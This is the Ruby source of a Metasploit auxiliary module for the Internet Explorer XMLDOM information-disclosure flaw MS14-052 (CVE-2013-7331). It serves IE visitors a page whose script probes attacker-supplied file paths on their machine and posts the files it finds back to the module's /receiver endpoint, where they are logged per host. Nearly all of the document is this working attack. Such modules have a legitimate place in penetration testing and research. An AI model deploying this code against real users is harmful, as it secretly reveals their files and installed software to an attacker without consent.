##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super(update_info(info,
      'Name'           => "MS14-052 Microsoft Internet Explorer XMLDOM Information Disclosure",
      'Description'    => %q{
        This module will use the Microsoft XMLDOM object to enumerate a remote user's filenames.
        To use it, you must supply your own list of file paths. Each file's format should look like this:
        c:\\\\windows\\\\system32\\\\calc.exe
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'References'     =>
        [
          [ 'CVE', '2013-7331'],
          [ 'URL', 'https://soroush.secproject.com/blog/2013/04/microsoft-xmldom-in-ie-can-divulge-information-of-local-drivenetwork-in-error-messages/' ],
          [ 'URL', 'https://www.alienvault.com/open-threat-exchange/blog/attackers-abusing-internet-explorer-to-enumerate-software-and-detect-securi' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Internet Explorer', {} ],
        ],
      'DisclosureDate' => "Sep 9 2014", # MSB. Used in the wild since Feb 2014
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPath.new('FILES', [ true, 'A list of files to enumerate. One absolute file path per line.' ])
      ], self.class
    )
  end

  def js
    target_files = parse_target_files
    js_target_files = target_files * ','

    %Q|
    #{js_base64}
    #{js_ie_addons_detect}
    #{js_ajax_post}

    var foundFileString = "";

    window.onload = function() {
      //var files = ['c:\\\\windows\\\\system32\\\\calc.exe'];
      var files = [#{js_target_files}];
      var foundFiles = ie_addons_detect.checkFiles(files);
      for (var file in foundFiles) {
        foundFileString += foundFiles[file] + "\|";
      }
      postInfo("#{get_resource}/receiver/", foundFileString, true);
    };
    |
  end

  def html
    %Q|
    <html>
    <head>
    </head>
    <body>
    <script>
    #{js}
    </script>
    </body>
    </html>
    |
  end

  def run
    exploit
  end

  def parse_found_files(cli, req)
    return if req.body.blank?

    files = req.body.split('|')
    unless files.empty?
      print_good("We have detected the following files:")
      files.each do |f|
        report_note(host: cli.peerhost, type: 'ie.filenames', data: f)
        print_good(f)
      end
    end
  end

  def parse_target_files
    @files ||= lambda {
      files = []
      buf = ::File.open(datastore['FILES'], 'rb') { |f| buf = f.read }
      buf.each_line do |line|
        if line =~ /^[a-z]:\\\\.+/i
          files << "'#{line.strip}'"
        end
      end

      return files
    }.call
  end

  def is_target_suitable?(user_agent)
    info = fingerprint_user_agent(user_agent)
    if info[:ua_name] == HttpClients::IE
      return true
    end

    false
  end

  def on_request_uri(cli, req)
    unless is_target_suitable?(req.headers['User-Agent'])
      send_not_found(cli)
      return
    end

    case req.uri
    when /receiver/
      parse_found_files(cli, req)
    else
      print_status("Sending HTML.")
      send_response(cli, html)
    end
  end

end
